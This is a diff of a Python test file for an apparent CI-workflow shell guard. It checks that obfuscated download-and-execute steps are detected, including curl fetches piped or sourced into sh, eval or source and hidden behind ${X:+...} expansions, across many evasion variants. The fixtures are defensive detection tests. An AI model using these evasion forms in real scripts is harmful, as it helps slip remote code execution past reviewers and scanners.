     # Round 14 (the round-13 verdict's B1, the seat's sh-ev-2 and its `source` / `.` twins): the
     # payload runs only on a mixed reading -- the fetch's W and the shell's word expanded to
-    # nothing -- which neither fold reads (#2929); the conflict between `sh -c true` and `eval`,
-    # `source` or `.` reports it.
+    # nothing -- which neither of the union's folds read, and #2929's do; the conflict between
+    # `sh -c true` and `eval`, `source` or `.` reports it too.
     MIXED = ('X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} eval "$(cat t.sh)"' % URL,
              "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} source ./t.sh" % URL,
              "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} . ./t.sh" % URL)
@@ -2371,6 +2856,380 @@ class TestTheUnionReadsBothHalves(unittest.TestCase):
             for shell in SHELLS:
                 with self.subTest(row=row, shell=shell):
                     self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestEveryMixedReadingIsRead(unittest.TestCase):
+    """#2929: the union read a job with every command word bash may expand to nothing as its W, then
+    with every one empty -- two of a step's 2^k readings -- so a payload only a mixed reading runs read
+    CLEAN. `shell_command.folds` now reads every set of such words whose halves read apart, up to
+    `_HALF_CAP`, each in a fold of its own, and a word past them reads as a command the guard cannot
+    read, wherever it runs."""
+
+    # The #2856 round-13 seat's hunts 49, 51 and 53: every parent runs each, and #2856 read each CLEAN.
+    SEAT = ("X=1\n${X:+curl -fsSLo tool https://example.test/tool}\n${Y:+/usr/bin/env true} sh tool",
+            "X=1\n${X:+curl -fsSL https://example.test/i.sh} | ${Y:+/usr/bin/env true} sh",
+            "Y=1\n${X:+/usr/bin/env true} curl -fsSL https://example.test/i.sh | ${Y:+/usr/bin/env sh}",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} . ./t.sh",
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} eval "$(cat t.sh)"',
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} source ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+unzip -q t.zip} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} sh ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+eval true} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+eval true} source ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+source /dev/null} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+. /dev/null} source ./t.sh",
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+. /dev/null} eval "$(cat t.sh)"',
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+source /dev/null} eval "$(cat t.sh)"')
+
+    def test_the_seats_rows_report(self):
+        for row in self.SEAT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    @staticmethod
+    def three(fetch, check, run):
+        """A row three such words decide, each read as `W` or `E` where the payload runs: a fetch, a
+        check that clears it where it runs, and a shell that runs it; the name of each `W` set."""
+        words = {("A", "W"): "${A:+curl -fsSLo t.sh %st.sh}" % URL,
+                 ("A", "E"): "${A:+/usr/bin/env true} curl -fsSLo t.sh %st.sh" % URL,
+                 ("C", "W"): "${C:+/usr/bin/env true} sha256sum -c sums", ("C", "E"): "${C:+sha256sum -c sums}",
+                 ("B", "W"): "${B:+sh t.sh}", ("B", "E"): "${B:+/usr/bin/env true} sh t.sh"}
+        names = [(name, half) for name, half in (("A", fetch), ("C", check), ("B", run))]
+        return ("".join("%s=1\n" % name for name, half in names if half == "W")
+                + "echo '%s  t.sh' > sums\n" % ("a" * 64) + "\n".join(words[place] for place in names))
+
+    def test_every_assignment_of_three_words_is_read(self):
+        # Each row runs only where its three words read as written -- W, W, E and the rest -- and the
+        # union read two of the eight; every one reports now, under every setting.
+        for fetch in "WE":
+            for check in "WE":
+                for run in "WE":
+                    row = self.three(fetch, check, run)
+                    for shell in SHELLS:
+                        with self.subTest(fetch=fetch, check=check, run=run, shell=shell):
+                            self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_word_past_the_cap_is_one_the_guard_cannot_read(self):
+        # Fail-closed, past `_HALF_CAP` such words, wherever the job runs, a download or none: the
+        # price. Three read every way, and nothing runs here. The sets the folds read are the first
+        # three's (`_masks`), and the words past them are still read, each with the cap's reason.
+        import shell_command
+        self.assertEqual(3, shell_command._HALF_CAP)
+        line = "${V%d:+/usr/bin/env echo} make t%d\n"
+        for count in (1, 3, 4, 8, 50, 200):     # one word, read again in each fold, is one place
+            with self.subTest(count=count):
+                found = wg.job_defects([wg.Step("step", "".join(line % (n, n) for n in range(count)), None)])
+                self.assertEqual(count > 3, bool(found))
+                reasons = " ".join(why for _name, why in found)
+                for past in range(3, count):        # each word past the cap, none cut
+                    self.assertIn("`${V%d:+/usr/bin/env echo}` is a command word bash may expand to nothing "
+                                  "beside 3 more" % past, reasons)
+
+    @staticmethod
+    def folds(texts):
+        """The number of folds `folds` reads, `texts` each parsed and read in every fold, and the words
+        whose halves read apart it met, by place."""
+        import shell_command
+        counts = []
+        for _sure in shell_reader.folds(lambda: False):
+            for text in texts:
+                for statement in shell_reader.statements(text):
+                    for stage in statement.stages:
+                        shell_reader.command(stage.argv)
+            counts.append(len(shell_command._HALVES["words"]))
+        return len(counts), counts[-1]
+
+    # The #2939 round-1 seat's shape: a word whose W fetches t.sh (the URL's fragment holds `./t.sh`)
+    # and whose empty half runs it, so the payload runs only where one place reads W and another empty.
+    PREP = "printf '' > t.sh\nchmod +x t.sh\n"
+    W = "${X:+curl -fsSLo t.sh %st.sh#}./t.sh" % URL
+
+    def test_a_word_is_one_word_however_often_its_text_is_read(self):
+        # By its place -- where its parse stands, a lifted text at its place in the text that lifted
+        # it, a step at its index (`shell_tokens._Parse.place`) -- and its order there, never what the
+        # text says: a text read twice in a fold holds one word, and a spelling written at two places
+        # is two, read every way (the seat's IdB.two.subst, IdB.two.back, IdC.subst-mixed,
+        # IdC.subst-echo, IdC.subst-proc and IdB.two.same-parse; every parent runs each).
+        once = "${X:+/usr/bin/env true} sh t\n"
+        self.assertEqual((2, 1), self.folds([once, once]))
+        self.assertEqual((4, 2), self.folds([once * 2]))
+        w = self.W
+        repeat = "${X:+curl -fsSLo t %st} sh t" % URL       # round 1's row: it reports on every tree
+        for row in ("X=1\n%s\nunset X\n%s\necho done" % (repeat, repeat),
+                    "X=1\nv=$(%s)\nunset X\nv=$(%s)" % (w, w), "X=1\nv=`%s`\nunset X\nv=`%s`" % (w, w),
+                    "X=1\nv=$(%s)\nunset X\nw=`%s`" % (w, w), 'X=1\necho "$(%s)"\nunset X\necho "$(%s)"' % (w, w),
+                    "X=1\ncat <(%s) >/dev/null\nunset X\ncat <(%s) >/dev/null" % (w, w), "X=1\n%s\nunset X\n%s" % (w, w)):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(self.PREP + row + "\n", shell))
+
+    def test_two_steps_of_one_text_are_two_places(self):
+        # MS.same: a job's steps are read at their index (`placed`), so two steps of one text hold two
+        # words (the seat runs the second with `X=1` in its environment, and every parent runs it); a
+        # step's own place is never a text read alone's, nor another step's, nor another text's.
+        import shell_tokens
+        text = self.W + "\n"
+        steps = [wg.Step("prep", self.PREP, None), wg.Step("one", text, None), wg.Step("two", text, None)]
+        self.assertTrue(wg.job_defects(steps))
+        places = {shell_tokens._Parse(t).place for t in (text, shell_reader.placed(text, 0),
+                                                         shell_reader.placed(text, 1), text + " ")}
+        self.assertEqual(4, len(places))
+
+    def test_a_program_a_shell_reads_on_its_standard_input_keeps_its_place(self):
+        # IdB.two.heredoc and the hunt's P2-hd, P2-hdbash and P2-hs rows: a heredoc's body, a
+        # here-string's too, that a shell reads as its program stands where its parent lifted it
+        # (`workflow_programs.stdin_scripts`, `at_place`), so two of one text are two places -- main
+        # and round 1 read each CLEAN while the parents run it. With a blank more in one of the two
+        # the pair reports as it did (the hunt's P1 rows), and with nothing downloaded each reads
+        # CLEAN (its B rows). So too the heredoc a FILE program's shell reads (`bash <(echo 'sh')
+        # <<'EOF'`, the function's second `at_place`), and one a `cat` prints into a `<(…)`.
+        w, fetch, bash = self.W, "curl -fsSLo t.sh %st.sh#" % URL, (None, "bash", "bash {0}")
+        env, moved = "X=1 %s\n%s", "X=1\nexport X\n%s\nunset X\n%s"
+        for form, shells in (("sh <<'EOF'\n%s\nEOF", SHELLS), ("bash <<'EOF'\n%s\nEOF", SHELLS),
+                             ("sh <<< '%s'", bash),                # `<<<` and `<(…)` are bash's
+                             ("bash <(echo 'sh') <<'EOF'\n%s\nEOF", bash), ("bash <(cat <<'EOF'\n%s\nEOF\n)", bash)):
+            one = form % w
+            for row in (env % (one, one), moved % (one, one), moved % (one, form % (w + " "))):
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(self.PREP + row + "\n", shell))
+                        self.assertFalse(reported(self.PREP + row.replace(fetch, "echo ") + "\n", shell))
+
+    def test_a_reader_nonce_splits_no_word(self):
+        # Idnonce.k1.nodl and Idnonce.k1.proc: a heredoc marker's random hex inside a `$(…)` or `<(…)`
+        # text reached the key, so one word was a new one at every parse, and the cap reported a job
+        # nothing runs; read by place, each is one word, CLEAN as `main` reads it.
+        for row in ("v=$(cat <<'EOF'\nhello\nEOF\n${Y:+/usr/bin/env true} echo hi)\necho \"$v\"\n",
+                    "cat <(cat <<'EOF'\nhello\nEOF\n${Y:+/usr/bin/env true} echo hi)\n"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual([], wg.job_defects([wg.Step("step", row, shell)]))
+
+    def test_only_the_readers_own_nonce_leaves_a_text_key(self):
+        # A program string is keyed by its text (the named limit), less the reader's own nonce and
+        # nothing else (round 3, B1): a marker of the reader's keeps its number and loses its nonce,
+        # whichever parse minted it, so its text read again keeps one key; text of the target's that
+        # is only shaped like a marker stays, at any width, so two such texts keep two keys.
+        import shell_text
+        import shell_tokens
+
+        def marker(number):
+            parse = shell_tokens._Parse("echo hi")
+            return [parse.new("subst", shell_text.Lifted("true", {})) for _ in range(number + 1)][-1]
+        first, again, other = (shell_tokens._Parse("sh " + marker(n)).place for n in (0, 0, 1))
+        self.assertEqual(first, again)
+        self.assertNotEqual(first, other)
+        self.assertNotIn(shell_tokens._OURS, first[1])
+        for width in (2, 32, 48):
+            with self.subTest(width=width):
+                one, two = (shell_tokens._Parse("echo @@shell-%s-0@@" % (digit * width)).place for digit in "ab")
+                self.assertNotEqual(one, two)
+                self.assertEqual("echo @@shell-%s-0@@" % ("a" * width), one[1])
+
+    def test_text_shaped_like_a_marker_is_the_targets_own(self):
+        # D.shcd-litmark and D.evq-litmark (round 3, B1): two program strings that differ only in
+        # text shaped like the reader's marker are two words, as round 1 read them -- round 2 took
+        # every such text out of the key and read each pair CLEAN while every parent runs it. So at
+        # a nonce's width; one copy alone fetches, runs nothing and reads CLEAN.
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\n"
+        for runner in ("sh -c '%s'", "eval '%s'"):
+            for width in (2, 32, 48):
+                one, two = (runner % ("echo @@shell-%s-0@@ >/dev/null; %s; true" % (digit * width, self.W))
+                            for digit in "ab")
+                for shell in SHELLS:
+                    with self.subTest(runner=runner, width=width, shell=shell):
+                        self.assertTrue(reported(pair % (one, two), shell))
+                        self.assertFalse(reported(self.PREP + "X=1\nexport X\n%s\n" % one, shell))
+
+    def test_a_word_that_may_be_a_program_keeps_one_key_whatever_nonce_its_parent_minted(self):
+        # The reader's own nonce does leave the key: a word that may be a shell's program is read with
+        # its `$(…)` left as the marker the step's parse minted (`workflow_forms._weighed`), anew in
+        # every fold, so with the nonce in the key its one word was a new one each time and the cap
+        # reported a step that fetches nothing and runs nothing.
+        word = "\\${Y:+/usr/bin/env echo} make all"
+        for row in ('X=-c\nsh $X "echo $(date) >/dev/null; %s"\n' % word, 'X=-c\nsh $X "echo `date` >/dev/null; %s"\n' % word,
+                    'X=-c\nsh $X "$(echo true); %s"\n' % word, 'O=-c\nbash $O "echo $(uname) >/dev/null; %s"\n' % word):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual([], wg.job_defects([wg.Step("step", row, shell)]))
+
+    def test_a_substitution_stands_under_its_parents_place(self):
+        # Round 3, B2: a `$(…)` takes its parent's place and its position there (`_Parse.new`), the
+        # whole chain of them, so one position under two parents is two places. Each pair runs the
+        # download under every parent, the first copy's W fetching and the second's empty half
+        # running; a place that dropped its parent, kept only the chain's root, or lost the middle of
+        # a chain two parses deep read each CLEAN (the round-2 seat's three mutants).
+        w = self.W
+        # Two steps of one text whose word stands in a `$(…)`, a backquote, a `<(…)` (M.subst.same,
+        # M.back.same, M.proc.same): the seat runs the first with `X=1` in its environment.
+        for text in ("v=$(%s)\n" % w, "v=`%s`\n" % w, "cat <(%s) >/dev/null\n" % w):
+            for shell in SHELLS:
+                with self.subTest(text=text, shell=shell):
+                    self.assertTrue(wg.job_defects([wg.Step("prep", self.PREP, shell), wg.Step("one", text, shell),
+                                                    wg.Step("two", text, shell)]))
+        # Two equal substitutions, each inside another, two deep and three (S.nest2, S.nest2b,
+        # S.nest3); two heredoc programs of one body whose word stands in a `$(…)` (I.substin) and
+        # two expanding heredocs that hold it (S.inhd); a step's own line and a `$(…)` that holds the
+        # same text (X.step+subst); and two program strings a blank apart that hold it
+        # (L.holdsubst.blank).
+        moved = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\n"
+        pairs = [(one, one) for one in ("v=$(echo $(%s; true))" % w, "v=$(echo `%s; true`)" % w,
+                                        "v=$(echo $(echo $(%s; true)))" % w, "sh <<'EOF'\nv=$(%s; true)\nEOF" % w,
+                                        "cat <<EOF >/dev/null\n$(%s; true)\nEOF" % w)]
+        pairs += [("%s; true" % w, "v=$(%s; true)" % w), ("sh -c 'v=$(%s; true)'" % w, "sh -c 'v=$(%s; true )'" % w)]
+        for one, two in pairs:
+            for shell in SHELLS:
+                with self.subTest(one=one, two=two, shell=shell):
+                    self.assertTrue(reported(moved % (one, two), shell))
+                    self.assertFalse(reported(self.PREP + "X=1\nexport X\n%s\n" % one, shell))
+
+    # The named limit's hunt (#2953): 9 spellings of a program string by 5 program shapes, none
+    # ending in the download's name -- one that does reports as one copy, on `main` too
+    # (`workflow_operands.covers` reads a `$` word ending in that name as a mention).
+    RUNNERS = ("sh -c '%s'", "bash -c '%s'", "eval '%s'", 'sh -c "%s"', 'eval "%s"', "env sh -c '%s'",
+               "bash -lc '%s'", "sh -ec '%s'")
+    SHAPES = ("%s; true", "%s && true", "true; %s; true", "( %s )", "%s >/dev/null")
+
+    def strings(self):
+        """Each program string of the limit's hunt, as the text a copy of it is written with."""
+        for shape in self.SHAPES:
+            for runner in self.RUNNERS:
+                yield lambda more="", shape=shape, runner=runner: runner % (shape % self.W + more)
+            yield lambda more="", shape=shape: 'sh -c "%s"' % (shape % self.W + more).replace("$", "\\$")
+
+    def test_two_identical_program_strings_at_two_places_are_one_word_2953(self):
+        # THE NAMED LIMIT, #2953 (the PR that hands a program string its place moves these rows to
+        # REPORT): a `-c` or an `eval` string reaches its parse by its text -- its parent's token,
+        # and `workflow_programs._parsed`, a cache keyed by the text -- so two byte-identical
+        # strings at two places are one word, and the payload their mixed reading runs (the first
+        # fetches, X set; the second runs it, X unset) reads CLEAN, as on `main`, while every parent
+        # runs it: all 45 pairs of the hunt, and an `eval` whose words bash joins.
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\necho done\n"
+        for string in self.strings():
+            for shell in SHELLS:
+                with self.subTest(string=string(), shell=shell):
+                    self.assertFalse(reported(pair % (string(), string()), shell))
+        join = "eval '%s;' 'true'" % self.W
+        self.assertFalse(reported(pair % (join, join)))
+
+    # The limit as wide as it is (round 3, B1): a string's own `$(…)`, backquote or `<(…)` is written
+    # `$(...)` in the text the reader is handed unless a printer spells it, so what stands inside one
+    # is no part of the key. What each of two strings holds in front of the word, by way of differing
+    # (the round-2 seat's D rows, and a `$(…)` against a backquote in its place).
+    INSIDE = (("v=$(true); ", "v=$(false); "), ("v=`true`; ", "v=`false`; "), ("v=$(true); ", "v=`true`; "),
+              ("cat <(true) >/dev/null; ", "cat <(false) >/dev/null; "),
+              ("v=$(tr a b <<'EOF'\none\nEOF\n); ", "v=$(tr a b <<'EOF'\ntwo\nEOF\n); "),
+              ("a=$(uname); b=$(uname); ", "a=$(uname -m); b=$(uname); "), ("v=$(echo $(true)); ", "v=$(echo $(false)); "))
+
+    def test_program_strings_alike_but_inside_a_substitution_are_one_word_2953(self):
+        # THE NAMED LIMIT, #2953 (the PR that hands a program string its place moves these rows to
+        # REPORT too): two program strings that read alike once each substitution no printer spells
+        # is written `$(...)` are one word -- identical strings, and strings that differ only inside
+        # such a substitution -- so the payload their mixed reading runs reads CLEAN, as on `main`,
+        # while a parent runs it: every pair here under `sh -c`, `bash -c` and `eval`, an `eval`
+        # whose words bash joins, and a string glued of two quotings.
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\n"
+        strings = [(runner % (one + self.W + "; true"), runner % (two + self.W + "; true"))
+                   for runner in ('sh -c "%s"', 'bash -c "%s"', 'eval "%s"') for one, two in self.INSIDE]
+        strings += [("eval \"v=$(true);\" '%s; true'" % self.W, "eval \"v=$(false);\" '%s; true'" % self.W),
+                    ("sh -c \"v=$(uname); \"'%s; true'" % self.W, "sh -c \"v=$(uname -m); \"'%s; true'" % self.W),
+                    ("sh -c v=$(true)\\;'%s; true'" % self.W, "sh -c v=$(false)\\;'%s; true'" % self.W)]
+        for one, two in strings:
+            for shell in SHELLS:
+                with self.subTest(one=one, two=two, shell=shell):
+                    self.assertFalse(reported(pair % (one, two), shell))
+
+    def test_program_strings_that_differ_are_two_words(self):
+        # What the key does hold. One blank more in the second string, outside any substitution, and
+        # the two are two words, read every way, so each pair reports -- `main` reads these CLEAN
+        # too; one copy alone fetches and runs nothing, and reads CLEAN. (The hunts hold each under
+        # all five settings.) So with the blank behind a substitution, and where the strings differ
+        # in what a printer spells (`$(echo true)`, a `cat` of a heredoc), in an arithmetic
+        # expansion, or in a word of the substitution that holds the word itself (the round-2 seat's
+        # D.shcd-printer, D.shcd-cathd, D.shcd-arith and D.shcd-inner-word).
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\necho done\n"
+        for string in self.strings():
+            for shell in (None, "sh"):
+                with self.subTest(string=string(), shell=shell):
+                    self.assertTrue(reported(pair % (string(), string(" ")), shell))
+            self.assertFalse(reported(self.PREP + "X=1\nexport X\n%s\necho done\n" % string()))
+        self.assertTrue(reported(pair % ("eval '%s;' 'true'" % self.W, "eval '%s;' 'true '" % self.W)))
+        w, escaped = self.W, "\\" + self.W
+        for one, two in (('sh -c "v=$(true); %s; true"' % w, 'sh -c "v=$(true); %s; true "' % w),
+                         ('sh -c "$(echo true); %s; true"' % w, 'sh -c "$(echo :); %s; true"' % w),
+                         ('sh -c "$(cat <<\'EOF\'\ntrue\nEOF\n); %s; true"' % w,
+                          'sh -c "$(cat <<\'EOF\'\n:\nEOF\n); %s; true"' % w),
+                         ('sh -c "v=$((1 + 1)); %s; true"' % escaped, 'sh -c "v=$((2 + 2)); %s; true"' % escaped),
+                         ('sh -c "v=$(true >/dev/null; %s; true)"' % w, 'sh -c "v=$(false || true >/dev/null; %s; true)"' % w)):
+            for shell in SHELLS:
+                with self.subTest(one=one, two=two, shell=shell):
+                    self.assertTrue(reported(pair % (one, two), shell))
+
+    def test_halves_that_run_one_command_word_with_other_operands_are_apart(self):
+        # B3 (SH.cat.pipe.k2-env): `cat sums cat` and `cat` both run `cat`, but the shell reads the
+        # download only where Q is unset: the word's halves read apart, so its empty half is read
+        # beside the fetch's W. Every parent runs it.
+        row = "Y=1\n${Y:+curl -fsSL %si.sh} | ${Q:+/usr/bin/env cat sums} cat | sh\n" % URL
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(row, shell))
+
+    def test_the_folds_stop_at_eight_however_many_words(self):
+        import shell_command
+        stages = [s.stages[0] for s in shell_reader.statements(
+            "".join("${V%d:+/usr/bin/env true} make t%d\n" % (n, n) for n in range(12)))]
+        # No word past the cap is kept, and the sets are the first three's alone: a reading that
+        # kept every word, or took a set of each, would grow as two to the words.
+        for _sure in shell_reader.folds(lambda: False):
+            for stage in stages:
+                shell_reader.command(stage.argv)
+            self.assertLessEqual(len(shell_command._HALVES["words"]), shell_command._HALF_CAP)
+            self.assertLessEqual(len(shell_command._masks()), 8)
+        # And `_masks` by itself, handed more words than the cap: the first three's sets, no more.
+        shell_command._HALVES.update(words=dict.fromkeys(range(12)), both=True)
+        try:
+            masks = shell_command._masks()
+        finally:
+            shell_command._HALVES.update(words={}, both=False)
+        self.assertEqual(8, len(masks))
+        self.assertEqual({0, 1, 2}, set().union(*masks[2:]))
+
+    def test_a_word_in_a_program_a_shell_runs_is_a_place_of_its_own(self):
+        # A nested program's first such word stands first in its own parse, as the step's does in
+        # the step's: the two parses' places keep them apart (the step's its index, the program
+        # string's its text), so the fetch's W and the shell's word empty are read together, and
+        # every parent runs each.
+        for runner in ("sh -c", "bash -c", "eval"):
+            row = "X=1\n${X:+curl -fsSLo t %st}\n%s '${Y:+/usr/bin/env true} sh t'" % (URL, runner)
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_the_unions_folds_come_first_and_read_as_they_did(self):
+        # All W, as `main` reads them, then all empty, a word past the cap too, as the union read
+        # them; then each other set of the first three, the fourth read W.
+        stages = [s.stages[0] for s in shell_reader.statements(
+            "".join("${V%d:+/usr/bin/env true} make t%d\n" % (n, n) for n in range(4)))]
+        readings = [[len(shell_reader.command(stage.argv)) for stage in stages]
+                    for _sure in shell_reader.folds(lambda: False)]
+        self.assertEqual([[3, 3, 3, 3], [2, 2, 2, 2]], readings[:2])
+        self.assertEqual(8, len(readings))
+        self.assertEqual({3}, {reading[3] for reading in readings[2:]})
+        self.assertEqual(6, len({tuple(reading[:3]) for reading in readings[2:]}))
+
+    def test_halves_that_read_one_command_add_no_fold(self):
+        # A word whose halves read alike (`${SUDO:+sudo} apt-get`) is read both ways in the union's two
+        # folds, as #2856 read it, but adds no other: five such lines are two folds, and no cap.
+        line = "${SUDO:+sudo -E} apt-get install -y x\n"
+        self.assertEqual((2, 0), self.folds([line * 5]))
+        self.assertFalse(reported(line * 5))
+
+    def test_the_folds_grow_as_two_to_the_words_up_to_the_cap(self):
+        line = "${V%d:+/usr/bin/env true} make t%d\n"
+        for count, folds in ((0, 1), (1, 2), (2, 4), (3, 8), (4, 8), (9, 8)):
+            with self.subTest(count=count):
+                self.assertEqual(folds, self.folds(["".join(line % (n, n) for n in range(count))])[0])
 
 
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
